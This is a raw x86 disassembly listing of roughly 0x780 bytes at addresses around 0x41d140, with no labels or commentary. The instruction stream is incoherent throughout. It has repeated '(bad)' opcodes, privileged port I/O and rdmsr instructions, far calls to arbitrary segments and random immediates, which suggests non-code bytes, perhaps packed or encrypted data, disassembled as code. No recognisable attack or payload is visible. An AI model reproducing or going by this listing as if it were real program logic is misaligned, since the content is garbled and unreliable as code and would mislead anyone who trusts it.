  41d140:	push   0x53555c46
  41d145:	or     al,0x92
  41d147:	pop    ebp
  41d148:	and    edx,DWORD PTR [edx]
  41d14a:	fs enter 0xcfb4,0xdd
  41d14f:	adc    al,0x32
  41d151:	not    DWORD PTR [edi]
  41d153:	ss dec ecx
  41d155:	inc    edx
  41d156:	mov    bh,0x73
  41d158:	or     BYTE PTR [ebx-0x72f7b537],dl
  41d15e:	bound  ebp,QWORD PTR [eax+0x4ce105db]
  41d164:	loope  0x41d0f2
  41d166:	adc    al,0xce
  41d168:	pop    eax
  41d169:	mov    bh,0x4f
  41d16b:	shr    esp,1
  41d16d:	push   ebp
  41d16e:	(bad)  
  41d16f:	xor    dl,bl
  41d171:	dec    edi
  41d172:	shr    DWORD PTR [ecx],0x68
  41d175:	cmc    
  41d176:	cmp    DWORD PTR [edi],esi
  41d178:	xchg   ah,ah
  41d17a:	ins    BYTE PTR es:[edi],dx
  41d17b:	stos   DWORD PTR es:[edi],eax
  41d17c:	dec    esp
  41d17d:	in     al,0xcc
  41d17f:	ins    DWORD PTR es:[edi],dx
  41d180:	sbb    al,0xf2
  41d182:	or     DWORD PTR [edi+0x22],edx
  41d185:	push   ss
  41d186:	arpl   WORD PTR ds:0xb3b150ad,dx
  41d18c:	jl     0x41d1ec
  41d18e:	sub    eax,0xd2589f9f
  41d193:	js     0x41d1e8
  41d195:	mov    bh,0xfd
  41d197:	aad    0x84
  41d199:	and    eax,0x42dc1ede
  41d19e:	repnz icebp 
  41d1a0:	or     dh,BYTE PTR [ebx-0x76113f39]
  41d1a6:	fs mov esp,0x78aa29dc
  41d1ac:	cld    
  41d1ad:	mov    al,ds:0x6eeea6f2
  41d1b2:	fst    QWORD PTR [edx+edx*8-0x782ad75]
  41d1b9:	push   esi
  41d1ba:	push   ebp
  41d1bb:	xchg   ah,bl
  41d1bd:	add    ebx,DWORD PTR [eax]
  41d1bf:	xor    eax,0xdfdefa25
  41d1c4:	inc    ebx
  41d1c5:	and    esp,0x6d
  41d1c8:	lahf   
  41d1c9:	rcr    DWORD PTR [esp+ebx*2],0x9d
  41d1cd:	popa   
  41d1ce:	jns    0x41d17d
  41d1d0:	add    dh,cl
  41d1d2:	pxor   mm7,mm0
  41d1d5:	cmc    
  41d1d6:	jae    0x41d1f2
  41d1d8:	jge    0x41d181
  41d1da:	add    bh,bl
  41d1dc:	(bad)  
  41d1dd:	repz mov al,ds:0x822107a6
  41d1e3:	sbb    ch,dh
  41d1e5:	div    DWORD PTR [edi-0x4d5ccd33]
  41d1eb:	mov    eax,ds:0xe77bdf1c
  41d1f0:	out    0x2c,eax
  41d1f2:	cmc    
  41d1f3:	aas    
  41d1f4:	jns    0x41d1bc
  41d1f6:	scas   al,BYTE PTR es:[edi]
  41d1f7:	mov    eax,0x7fbfdf8
  41d1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1fd:	push   ss
  41d1fe:	jp     0x41d1a8
  41d200:	call   0x7f0e:0x9f8b8126
  41d207:	stos   BYTE PTR es:[edi],al
  41d208:	ret    0xe8ac
  41d20b:	push   0xfffffff7
  41d20d:	dec    eax
  41d20e:	stc    
  41d20f:	fiadd  WORD PTR ds:0x7864f550
  41d215:	jb     0x41d238
  41d217:	xor    ch,ch
  41d219:	mov    ds:0x382b9288,al
  41d21e:	jae    0x41d203
  41d220:	(bad)  [ebp-0x616d3b7d]
  41d226:	ja     0x41d252
  41d228:	and    edi,edx
  41d22a:	call   0x6c8a:0x315af57b
  41d231:	int3   
  41d232:	or     eax,0x7ce00ad
  41d237:	es sbb esp,0x2d
  41d23b:	outs   dx,DWORD PTR ds:[esi]
  41d23c:	rcr    ah,1
  41d23e:	ins    DWORD PTR es:[edi],dx
  41d23f:	enter  0xd5d4,0xf7
  41d243:	xchg   esi,eax
  41d244:	mov    cl,0xb9
  41d246:	fild   QWORD PTR [eax]
  41d248:	es or  eax,0x5652c89f
  41d24e:	xchg   ebx,eax
  41d24f:	push   eax
  41d250:	jne    0x41d2b6
  41d252:	add    bl,cl
  41d254:	out    0x89,al
  41d256:	repnz inc eax
  41d258:	addr16 sbb eax,0x9c63c33d
  41d25e:	cmp    al,0xc7
  41d260:	ds inc esp
  41d262:	xor    al,0x34
  41d264:	jne    0x41d2c4
  41d266:	jp     0x41d2d8
  41d268:	mov    dh,0x64
  41d26a:	aad    0xb
  41d26c:	out    0x46,al
  41d26e:	ret    0xe03c
  41d271:	mov    ebp,0x6a32337d
  41d276:	mov    ebp,0xe493670c
  41d27b:	fisttp DWORD PTR ds:0x386a7d06
  41d281:	push   es
  41d282:	pop    edi
  41d283:	sub    al,0x39
  41d285:	stos   DWORD PTR es:[edi],eax
  41d286:	mov    edx,DWORD PTR [ebp+ebp*8+0x22780213]
  41d28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d28e:	dec    ebx
  41d28f:	pusha  
  41d290:	scas   al,BYTE PTR es:[edi]
  41d291:	add    al,BYTE PTR [edi+esi*2+0x489d27ce]
  41d298:	call   0xc624:0x658a6920
  41d29f:	jp     0x41d2e1
  41d2a1:	cmp    eax,0x1cba72b5
  41d2a6:	push   0xf85536b8
  41d2ab:	push   esp
  41d2ac:	pop    ss
  41d2ad:	hlt    
  41d2ae:	sbb    BYTE PTR [eax],0x5e
  41d2b1:	mov    BYTE PTR [ebp+0x17],bl
  41d2b4:	inc    esp
  41d2b5:	data16 arpl WORD PTR [eax],ax
  41d2b8:	shr    esi,1
  41d2ba:	push   cs
  41d2bb:	in     al,0x75
  41d2bd:	rdmsr  
  41d2bf:	inc    ebx
  41d2c0:	pop    es
  41d2c1:	pop    ds
  41d2c2:	aam    0x32
  41d2c4:	cdq    
  41d2c5:	ss int 0x60
  41d2c8:	in     eax,dx
  41d2c9:	fdivr  QWORD PTR [esi+0x20505a8c]
  41d2cf:	shr    BYTE PTR [edx+0x589cd815],cl
  41d2d5:	jno    0x41d2ac
  41d2d7:	xchg   DWORD PTR [eax+0x5],esi
  41d2da:	adc    al,0x31
  41d2dc:	loop   0x41d31c
  41d2de:	fwait
  41d2df:	sbb    ch,dh
  41d2e1:	test   al,0xcb
  41d2e3:	imul   edi,esi,0xea15da6
  41d2e9:	imul   ebp,DWORD PTR [edx+0x45],0x3f34667e
  41d2f0:	cmp    eax,0x2ca6b23e
  41d2f5:	mov    DWORD PTR [eax],edi
  41d2f7:	adc    DWORD PTR [eax+0xbed21ed],ebx
  41d2fd:	xor    al,0xda
  41d2ff:	test   ah,0x66
  41d302:	mov    ebx,0x86cadc6a
  41d307:	and    BYTE PTR [edx+eiz*4+0x34ffd5b9],0xe5
  41d30f:	fcomp  st(6)
  41d311:	jp     0x41d2ea
  41d313:	mov    al,BYTE PTR ds:0x4f2cdf1b
  41d319:	popa   
  41d31a:	jae    0x41d393
  41d31c:	mov    eax,ds:0x18d41b1e
  41d321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d322:	mov    ebx,0xf53d2e78
  41d327:	xchg   DWORD PTR [ebp-0x36],edx
  41d32a:	adc    bh,BYTE PTR [edi-0x795347fd]
  41d330:	out    dx,al
  41d331:	or     dl,dl
  41d333:	sub    ch,al
  41d335:	sbb    al,0x8e
  41d337:	loop   0x41d360
  41d339:	(bad)  
  41d33a:	aas    
  41d33b:	(bad)  
  41d33d:	js     0x41d318
  41d33f:	inc    edx
  41d340:	adc    al,0xb2
  41d342:	ja     0x41d3ad
  41d344:	and    DWORD PTR [edx+0x1c],ebx
  41d347:	out    dx,al
  41d348:	(bad)  
  41d34a:	cmp    BYTE PTR [esi-0x4c643069],dl
  41d350:	pop    ecx
  41d351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d352:	fs xchg ecx,eax
  41d354:	imul   esp,DWORD PTR [ebx+0x6b],0x70
  41d358:	idiv   BYTE PTR [esi]
  41d35a:	ins    DWORD PTR es:[edi],dx
  41d35b:	and    BYTE PTR [ecx],ch
  41d35d:	inc    edx
  41d35e:	(bad)  
  41d35f:	jno    0x41d36f
  41d361:	sub    dh,cl
  41d363:	gs jmp 0x61198f8d
  41d369:	into   
  41d36a:	test   BYTE PTR [ecx+0x2e],0x50
  41d36e:	jmp    DWORD PTR [ebx+0x7f3da4ba]
  41d374:	mov    ds:0x6e11c76f,al
  41d379:	jns    0x41d340
  41d37b:	fs mov dh,0x4c
  41d37e:	lahf   
  41d37f:	sub    eax,0x6393fd94
  41d384:	adc    eax,0xa6ebfd70
  41d389:	adc    BYTE PTR [esi],al
  41d38b:	fdiv   st,st(5)
  41d38d:	hlt    
  41d38e:	jb     0x41d3b4
  41d390:	int3   
  41d391:	mov    ebx,0xe5355bbe
  41d396:	je     0x41d352
  41d398:	pop    es
  41d399:	mov    dl,0xb1
  41d39b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d39c:	jp     0x41d37f
  41d39e:	mov    ch,0xbf
  41d3a0:	popa   
  41d3a1:	inc    BYTE PTR [ecx-0x74]
  41d3a4:	push   ebp
  41d3a5:	aas    
  41d3a6:	ror    BYTE PTR [ebp-0xbcef2a4],0x2
  41d3ad:	add    eax,0x1d5f83ca
  41d3b2:	enter  0x6749,0xe7
  41d3b6:	mov    al,0xa9
  41d3b8:	ret    0xede0
  41d3bb:	hlt    
  41d3bc:	daa    
  41d3bd:	adc    edx,DWORD PTR [ebx+0x689dce07]
  41d3c3:	retf   
  41d3c4:	sub    DWORD PTR [edi],ebp
  41d3c6:	xor    eax,0x75e7f87e
  41d3cb:	cs dec ebx
  41d3cd:	xor    DWORD PTR [eax],edi
  41d3cf:	out    0xde,eax
  41d3d1:	loope  0x41d41c
  41d3d3:	xchg   DWORD PTR fs:[esp+ecx*4+0x2c],esp
  41d3d8:	push   edi
  41d3d9:	and    al,BYTE PTR [ebx+0x4d]
  41d3dc:	dec    edx
  41d3dd:	ss ins DWORD PTR es:[edi],dx
  41d3df:	loopne 0x41d409
  41d3e1:	xor    ebp,DWORD PTR [ecx-0x54fe1842]
  41d3e7:	mov    edx,0x4bfbf5e4
  41d3ec:	xor    BYTE PTR [ebx],0x8d
  41d3ef:	mov    ecx,0xd593584f
  41d3f4:	aad    0x85
  41d3f6:	xchg   ecx,eax
  41d3f7:	xor    eax,0xbe38bc65
  41d3fc:	daa    
  41d3fd:	xchg   ecx,eax
  41d3fe:	enter  0x9948,0x16
  41d402:	adc    al,0x3e
  41d404:	xor    DWORD PTR [edx+ecx*4],0xbcedd7d7
  41d40b:	cmp    dh,BYTE PTR [ecx+edi*2-0xbc7d694]
  41d412:	inc    ecx
  41d413:	clc    
  41d414:	and    ebx,ebp
  41d416:	and    ebx,esi
  41d418:	xor    esi,DWORD PTR [eax]
  41d41a:	imul   eax,esp,0x6ceabd78
  41d420:	shl    BYTE PTR [eax-0x42],0x3a
  41d424:	push   edx
  41d425:	pop    es
  41d426:	cdq    
  41d427:	cdq    
  41d428:	ss push edx
  41d42a:	xor    dh,ah
  41d42c:	inc    ecx
  41d42d:	and    al,0x99
  41d42f:	rcr    DWORD PTR [esi-0x2c],cl
  41d432:	mov    edi,0x4a290f98
  41d438:	add    al,0xaa
  41d43a:	sub    esi,0xe644a809
  41d440:	mov    ebx,0x8f6f7025
  41d445:	test   al,0xd3
  41d447:	jae    0x41d3d1
  41d449:	push   0xbca5c69
  41d44e:	pop    es
  41d44f:	and    eax,esi
  41d451:	sub    ebx,DWORD PTR [ecx-0x3e]
  41d454:	outs   dx,DWORD PTR ds:[esi]
  41d455:	call   0x15a2b19
  41d45a:	jl     0x41d4d4
  41d45c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d45d:	push   eax
  41d45e:	adc    al,BYTE PTR [edi]
  41d460:	jbe    0x41d4dd
  41d462:	addr16 test ch,bl
  41d465:	mov    edx,0x487a4b7c
  41d46a:	mov    esp,0xcab9fd33
  41d46f:	push   0x5a
  41d471:	push   esi
  41d472:	adc    BYTE PTR [edi-0x25a29957],ch
  41d478:	outs   dx,DWORD PTR ds:[esi]
  41d479:	in     al,dx
  41d47a:	in     al,dx
  41d47b:	cld    
  41d47c:	mov    edx,0xbb108cd
  41d481:	fistp  DWORD PTR [ebp-0x14]
  41d484:	ds in  al,dx
  41d486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d487:	cdq    
  41d488:	mov    al,ds:0x4ea3916f
  41d48d:	(bad)  
  41d48e:	sub    BYTE PTR [ebx],bh
  41d490:	fsub   QWORD PTR [esi]
  41d492:	dec    esp
  41d493:	dec    esi
  41d494:	ret    0x1638
  41d497:	dec    edi
  41d498:	jmp    FWORD PTR [ebp+0x4e]
  41d49b:	fldenv [eax-0x2739eff8]
  41d4a1:	adc    ah,0xb9
  41d4a4:	inc    esp
  41d4a5:	jb     0x41d4b2
  41d4a7:	cwde   
  41d4a8:	inc    ecx
  41d4a9:	jl     0x41d528
  41d4ab:	jb     0x41d47c
  41d4ad:	push   ebp
  41d4ae:	jg     0x41d4f1
  41d4b0:	mov    ds:0x57155ad0,al
  41d4b5:	cmp    ebp,DWORD PTR [ebx+0xb7f40b4]
  41d4bb:	daa    
  41d4bc:	or     eax,0x9e2efec3
  41d4c1:	push   esi
  41d4c2:	and    al,0x88
  41d4c4:	push   ecx
  41d4c5:	pop    es
  41d4c6:	dec    esp
  41d4c7:	pop    ebx
  41d4c8:	sbb    al,0x77
  41d4ca:	(bad)  
  41d4cb:	or     BYTE PTR es:[edi],ah
  41d4ce:	arpl   WORD PTR [ebx-0x64],bx
  41d4d1:	jne    0x41d503
  41d4d3:	cld    
  41d4d4:	(bad)  
  41d4d5:	std    
  41d4d6:	ds jb  0x41d531
  41d4d9:	daa    
  41d4da:	dec    ebx
  41d4db:	mov    WORD PTR [edi+0x68],?
  41d4de:	add    al,0x89
  41d4e0:	loop   0x41d4a1
  41d4e2:	std    
  41d4e3:	xchg   BYTE PTR [esi-0x12],dh
  41d4e6:	pop    es
  41d4e7:	outs   dx,DWORD PTR ds:[esi]
  41d4e8:	lods   al,BYTE PTR ds:[esi]
  41d4e9:	pushf  
  41d4ea:	jecxz  0x41d560
  41d4ec:	mov    ds:0x9b831b5d,al
  41d4f1:	pop    eax
  41d4f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4f3:	xchg   ecx,eax
  41d4f4:	dec    esi
  41d4f5:	fcmove st,st(2)
  41d4f7:	int3   
  41d4f8:	xchg   ebx,eax
  41d4f9:	xchg   ebx,eax
  41d4fa:	fs cmp eax,0x593b4da3
  41d500:	ror    DWORD PTR ds:0xe812fff9,1
  41d506:	inc    ebx
  41d507:	int3   
  41d508:	jmp    0x1a2b6d8d
  41d50d:	pop    ds
  41d50e:	add    cl,BYTE PTR [edx+0x45]
  41d511:	jbe    0x41d4c0
  41d513:	pusha  
  41d514:	sub    ebx,DWORD PTR [ecx-0x3e]
  41d517:	dec    edi
  41d518:	mov    WORD PTR [edi+0x52],cs
  41d51b:	pushf  
  41d51c:	sbb    al,0xfe
  41d51e:	dec    edx
  41d51f:	outs   dx,BYTE PTR ds:[esi]
  41d520:	inc    esp
  41d521:	and    eax,0xcd252aea
  41d526:	aad    0x74
  41d528:	xlat   BYTE PTR ds:[ebx]
  41d529:	cmp    ah,BYTE PTR [edx+0xd53a81f]
  41d52f:	pushf  
  41d530:	and    eax,0xf81fd57d
  41d535:	cdq    
  41d536:	and    DWORD PTR [edi+eiz*4+0x6],eax
  41d53a:	adc    ah,dl
  41d53c:	aam    0x27
  41d53e:	ja     0x41d56a
  41d540:	mov    ds:0x30f1b230,al
  41d545:	push   cs
  41d546:	push   0x6b9c304b
  41d54b:	jmp    0x6840:0x4c52d0e1
  41d552:	test   eax,0xf9b0e06
  41d557:	outs   dx,DWORD PTR ds:[esi]
  41d558:	shl    BYTE PTR [eax-0x33fc36be],0xd1
  41d55f:	xchg   DWORD PTR [eax+0x149812f2],esp
  41d565:	stos   DWORD PTR es:[edi],eax
  41d566:	leave  
  41d567:	xor    bh,dl
  41d569:	add    ah,BYTE PTR [edi+0x68bfb996]
  41d56f:	pop    eax
  41d570:	shr    DWORD PTR [ebx-0x5c2d3abf],0x91
  41d577:	jb     0x41d5cb
  41d579:	icebp  
  41d57a:	ret    0xe636
  41d57d:	adc    eax,esi
  41d57f:	test   eax,0x1c079267
  41d584:	arpl   bx,bp
  41d586:	lods   al,BYTE PTR ds:[esi]
  41d587:	push   cs
  41d588:	dec    ebx
  41d589:	fbstp  TBYTE PTR [ecx+0x21da1b64]
  41d58f:	inc    edx
  41d590:	jne    0x41d527
  41d592:	sub    BYTE PTR [ebx],ah
  41d594:	pop    ebp
  41d595:	cmp    DWORD PTR [ebx],edx
  41d597:	repnz pop ebp
  41d599:	adc    bh,BYTE PTR [eax-0xd]
  41d59c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d59d:	inc    esp
  41d59e:	push   ebx
  41d59f:	xor    DWORD PTR [ecx+0x14],ecx
  41d5a2:	lahf   
  41d5a3:	repnz ins DWORD PTR es:[edi],dx
  41d5a5:	bound  esp,QWORD PTR [edx+0x1f]
  41d5a8:	loopne 0x41d584
  41d5aa:	dec    ebx
  41d5ab:	push   0x70
  41d5ad:	dec    ebp
  41d5ae:	pop    esi
  41d5af:	jbe    0x41d5b0
  41d5b1:	popf   
  41d5b2:	sub    al,dh
  41d5b4:	jmp    0x41d5a3
  41d5b6:	mov    BYTE PTR [edi*1-0x13c41ae9],cl
  41d5bd:	mov    ecx,0x557336a1
  41d5c2:	xlat   BYTE PTR ds:[ebx]
  41d5c3:	loop   0x41d5f7
  41d5c5:	mov    ch,0xa0
  41d5c7:	or     cl,bl
  41d5c9:	xor    dl,BYTE PTR [ecx+0x6da5f8a4]
  41d5cf:	fist   WORD PTR [edx+ecx*4]
  41d5d2:	jp     0x41d5f4
  41d5d4:	dec    eax
  41d5d5:	dec    ebp
  41d5d6:	popa   
  41d5d7:	jno    0x41d5d6
  41d5d9:	sbb    al,0x12
  41d5db:	xor    BYTE PTR [ebx],0xa8
  41d5de:	or     al,dh
  41d5e0:	mov    ds:0xc2db4ac3,al
  41d5e5:	add    DWORD PTR [edi-0x4d],esi
  41d5e8:	add    al,0x42
  41d5ea:	ins    DWORD PTR es:[edi],dx
  41d5eb:	and    ecx,DWORD PTR [edx+0x6bab019e]
  41d5f1:	(bad)  
  41d5f2:	pop    ebx
  41d5f3:	fbstp  TBYTE PTR [edi+0x2e2553ab]
  41d5f9:	in     al,0x7b
  41d5fb:	add    eax,0x246fbaa1
  41d600:	and    al,0x71
  41d602:	mov    dh,0x14
  41d604:	inc    BYTE PTR [eax+eax*2]
  41d607:	xchg   esp,eax
  41d608:	fild   QWORD PTR [esi]
  41d60a:	cli    
  41d60b:	daa    
  41d60c:	and    al,0x29
  41d60e:	lods   eax,DWORD PTR ds:[esi]
  41d60f:	in     eax,dx
  41d610:	and    bh,0x72
  41d613:	popf   
  41d614:	or     al,ah
  41d616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d617:	cli    
  41d618:	int    0x79
  41d61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d61b:	xor    edi,DWORD PTR [edx+0x17]
  41d61e:	outs   dx,DWORD PTR ds:[esi]
  41d61f:	bnd jb 0x41d61d
  41d622:	lods   eax,DWORD PTR ds:[esi]
  41d623:	sub    BYTE PTR [esi+0x2aaf6676],dl
  41d629:	int3   
  41d62a:	mov    esi,DWORD PTR [ebx]
  41d62c:	inc    ecx
  41d62d:	mov    WORD PTR [edi-0x4e],ss
  41d630:	push   edi
  41d631:	test   BYTE PTR [ecx+0x3b5709a8],0xc
  41d638:	mov    ebx,0x70e947d3
  41d63d:	sar    BYTE PTR [esi+0x34],cl
  41d640:	fadd   QWORD PTR [edi-0x39]
  41d643:	bound  ebp,QWORD PTR [ebx+0x52]
  41d646:	ins    BYTE PTR es:[edi],dx
  41d647:	push   eax
  41d648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d649:	xchg   esp,eax
  41d64a:	out    dx,eax
  41d64b:	loop   0x41d6c5
  41d64d:	repz xchg ebx,eax
  41d64f:	mov    al,0xa8
  41d651:	mov    dh,0x8f
  41d653:	lods   eax,DWORD PTR ds:[esi]
  41d654:	xchg   ecx,eax
  41d655:	mov    ah,0x5
  41d657:	fadd   st(4),st
  41d659:	mov    ds,WORD PTR [edx+eax*2+0x2b32c7fc]
  41d660:	sub    DWORD PTR [ebx+0x1aa379c9],0xcd5257d2
  41d66a:	cmc    
  41d66b:	adc    eax,0x4c998784
  41d670:	outs   dx,DWORD PTR ds:[esi]
  41d671:	leave  
  41d672:	and    dl,BYTE PTR [edx-0x9]
  41d675:	enter  0x5be2,0x8f
  41d679:	cmc    
  41d67a:	retf   
  41d67b:	mov    dl,0x8a
  41d67d:	inc    esi
  41d67e:	ficom  DWORD PTR [ecx+ecx*2-0xf]
  41d682:	push   ebx
  41d683:	mov    bl,0x2b
  41d685:	out    0x5f,eax
  41d687:	into   
  41d688:	push   esp
  41d689:	sub    eax,0xd345a58
  41d68e:	push   cs
  41d68f:	outs   dx,BYTE PTR ds:[esi]
  41d690:	repnz and BYTE PTR [ecx+0x5b3f932b],bh
  41d697:	arpl   WORD PTR [ebx],ax
  41d699:	mov    ecx,0xaaf8c326
  41d69e:	(bad)  
  41d69f:	daa    
  41d6a0:	fsub   st,st(2)
  41d6a2:	and    BYTE PTR [edi],ch
  41d6a4:	or     al,0xf9
  41d6a6:	mov    al,ds:0x72b4681b
  41d6ab:	and    BYTE PTR [edi-0x22e101d1],dh
  41d6b1:	inc    ecx
  41d6b2:	pop    ecx
  41d6b3:	sbb    eax,0x4b72fd63
  41d6b8:	jnp    0x41d72e
  41d6ba:	in     al,0x14
  41d6bc:	sub    al,0x15
  41d6be:	xchg   esi,eax
  41d6bf:	sub    DWORD PTR [ecx-0x62818a38],ebx
  41d6c5:	call   0xdf4150bd
  41d6ca:	out    0x7a,eax
  41d6cc:	loope  0x41d6d1
  41d6ce:	push   ss
  41d6cf:	in     al,dx
  41d6d0:	add    dl,BYTE PTR [ecx-0x21]
  41d6d3:	inc    ecx
  41d6d4:	retf   0xafcc
  41d6d7:	mov    bl,0xb3
  41d6d9:	and    al,BYTE PTR [eax]
  41d6db:	test   eax,0x8a2d33a3
  41d6e0:	inc    ecx
  41d6e1:	cmp    dh,BYTE PTR [ebx-0x478426bc]
  41d6e7:	pop    es
  41d6e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6e9:	mov    ds:0xced8ad66,eax
  41d6ee:	sbb    dh,BYTE PTR [edi+0x569acd32]
  41d6f4:	sbb    al,0x4b
  41d6f6:	in     al,0x9d
  41d6f8:	mov    edi,0x94e6c50c
  41d6fd:	outs   dx,BYTE PTR ds:[esi]
  41d6fe:	imul   DWORD PTR [esi-0x195ef233]
  41d704:	cmp    eax,0xab38fe1d
  41d709:	inc    ebx
  41d70a:	adc    al,0x79
  41d70c:	adc    al,0x6d
  41d70e:	sub    ah,dl
  41d710:	mov    ebx,0xa843ad2c
  41d715:	sub    dl,ch
  41d717:	repnz mov DWORD PTR [eax+ebp*8+0x70],ebp
  41d71c:	(bad)  
  41d71d:	xlat   BYTE PTR ds:[ebx]
  41d71e:	stos   BYTE PTR es:[edi],al
  41d71f:	stc    
  41d720:	arpl   WORD PTR [edi-0x50],si
  41d723:	mov    al,ds:0x590afde5
  41d728:	enter  0x3c41,0x9
  41d72c:	ins    BYTE PTR es:[edi],dx
  41d72d:	int3   
  41d72e:	lds    ebx,FWORD PTR [edi-0x1f4fe549]
  41d734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d735:	(bad)  
  41d738:	call   0xa4cbd2df
  41d73d:	jp     0x41d70d
  41d73f:	sub    dh,BYTE PTR [esi]
  41d741:	cs aaa 
  41d743:	(bad)  
  41d744:	push   0x1d
  41d746:	out    0xbb,eax
  41d748:	inc    esi
  41d749:	push   ecx
  41d74a:	sbb    eax,0x8003a422
  41d74f:	mov    ds:0x73a220bc,eax
  41d754:	loope  0x41d7d1
  41d756:	imul   eax,DWORD PTR [ecx],0xbb0dfdf
  41d75c:	mov    cl,0x7
  41d75e:	xchg   esp,eax
  41d75f:	dec    esp
  41d760:	mov    ebx,0x5bbc1dc0
  41d765:	mov    eax,ds:0xb5a5490c
  41d76a:	xchg   esp,eax
  41d76b:	(bad)
  41d76e:	ret    0x1a8b
  41d771:	jmp    0x5fc:0x4dac88f5
  41d778:	arpl   WORD PTR ds:0xa37f2ac8,di
  41d77e:	in     eax,0x3f
  41d780:	daa    
  41d781:	mov    eax,0x14230f50
  41d786:	and    BYTE PTR [ecx],0xd9
  41d789:	in     al,0xae
  41d78b:	test   eax,0xeba01468
  41d790:	push   cs
  41d791:	stos   DWORD PTR es:[edi],eax
  41d792:	sub    al,BYTE PTR ds:0x91d744cd
  41d798:	in     eax,dx
  41d799:	sar    edi,0x52
  41d79c:	pop    ecx
  41d79d:	mov    ah,0x22
  41d79f:	mov    ds:0x77edb17d,eax
  41d7a4:	xchg   ebx,eax
  41d7a5:	btr    ebx,ecx
  41d7a8:	rcl    DWORD PTR [ebx],cl
  41d7aa:	test   al,0xa0
  41d7ac:	ret    0xda99
  41d7af:	adc    BYTE PTR [ecx+0x79ed33a6],bl
  41d7b5:	iret   
  41d7b6:	sti    
  41d7b7:	mov    edx,DWORD PTR [ebx]
  41d7b9:	xchg   esp,eax
  41d7ba:	mov    edx,0x6b9758b5
  41d7bf:	stos   BYTE PTR es:[edi],al
  41d7c0:	test   BYTE PTR [ecx+0xc],bl
  41d7c3:	pushf  
  41d7c4:	cmp    ecx,edx
  41d7c6:	lea    esi,[esi]
  41d7c8:	cmp    BYTE PTR [ecx+0x388d2811],bh
  41d7ce:	push   ecx
  41d7cf:	loope  0x41d78b
  41d7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7d2:	xor    ch,BYTE PTR ds:0x4ea5eb2a
  41d7d8:	(bad)  
  41d7d9:	retf   0x6697
  41d7dc:	sub    BYTE PTR [edx],dl
  41d7de:	sti    
  41d7df:	test   ebp,ebx
  41d7e1:	fild   DWORD PTR [ebx+0x7f0be9c2]
  41d7e7:	fcomp  QWORD PTR [esi-0xd]
  41d7ea:	jle    0x41d81b
  41d7ec:	hlt    
  41d7ed:	adc    BYTE PTR [edx+0x3ad9e6a4],cl
  41d7f3:	jle    0x41d779
  41d7f5:	inc    ecx
  41d7f6:	mov    al,ds:0xdee7836
  41d7fb:	push   ecx
  41d7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7fd:	cmp    eax,0x877330d0
  41d802:	pop    es
  41d803:	xor    al,0x3b
  41d805:	or     al,0xd3
  41d807:	cmp    BYTE PTR [esi-0x495df911],0xa2
  41d80e:	xor    bl,BYTE PTR [esp+edx*2-0x3f77bd2d]
  41d815:	lods   eax,DWORD PTR ds:[esi]
  41d816:	jno    0x41d7bc
  41d818:	fldcw  WORD PTR [esi+0x220644f0]
  41d81e:	ja     0x41d810
  41d820:	ins    BYTE PTR es:[edi],dx
  41d821:	in     al,0xde
  41d823:	clc    
  41d824:	pushf  
  41d825:	jmp    FWORD PTR [esi-0x681e8e3]
  41d82b:	pop    eax
  41d82c:	ja     0x41d866
  41d82e:	imul   esp,DWORD PTR [ecx+esi*2],0x348efb29
  41d835:	mov    eax,0x40ff4f4f
  41d83a:	sub    ch,bl
  41d83c:	or     BYTE PTR [ebp-0x2],cl
  41d83f:	mov    cl,0xb1
  41d841:	jecxz  0x41d851
  41d843:	xchg   ebx,eax
  41d844:	adc    ecx,DWORD PTR [esi+0x6dc1e375]
  41d84a:	outs   dx,BYTE PTR ds:[esi]
  41d84b:	sub    al,0x20
  41d84d:	mov    esp,0x27c18051
  41d852:	gs neg ah
  41d855:	pop    ds
  41d856:	pop    ss
  41d857:	mov    eax,ds:0xb5642cab
  41d85c:	mov    gs,WORD PTR [edx]
  41d85e:	cmp    DWORD PTR [edi-0x7f],0x75a6f565
  41d865:	imul   ebp,DWORD PTR [ebp+0x68d3d553],0xca49fdff
  41d86f:	push   ebp
  41d870:	sbb    eax,0x8e994489
  41d875:	dec    edx
  41d876:	xchg   BYTE PTR [ecx],dh
  41d878:	adc    bh,0xa2
  41d87b:	push   es
  41d87c:	pusha  
  41d87d:	popaw  
  41d87f:	jl     0x41d8fc
  41d881:	shl    BYTE PTR [esi-0x19],cl
  41d884:	pop    esi
  41d885:	inc    eax
  41d886:	push   ecx
  41d887:	pop    esp
  41d888:	mov    bh,0xbb
  41d88a:	enter  0xef7e,0x62
  41d88e:	cmc    
  41d88f:	xor    eax,0x4143dcf0
  41d894:	cli    
  41d895:	shr    DWORD PTR [ebx+0x6a5a653a],cl
  41d89b:	ins    DWORD PTR es:[edi],dx
  41d89c:	push   cs
  41d89d:	push   ebx
  41d89e:	stos   BYTE PTR es:[edi],al
  41d89f:	test   al,0x2a
  41d8a1:	mov    eax,0xb2cfea5
  41d8a6:	jle    0x41d88d
  41d8a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8a9:	fidiv  WORD PTR [ebx+0x54c46bea]
  41d8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b0:	aam    0x74
  41d8b2:	in     al,0x20
  41d8b4:	jmp    0xe122c590
  41d8b9:	sti    
  41d8ba:	out    dx,al
  41d8bb:	popa   
  41d8bc:	lods   al,BYTE PTR ds:[esi]
  41d8bd:	pop    ss
  41d8be:	(bad)  
  41d8c0:	ja     0x41d8fc
  41d8c2:	int    0xa3
  41d8c4:	sbb    DWORD PTR [ebx],edx
  41d8c6:	push   ebx
  41d8c7:	pop    es
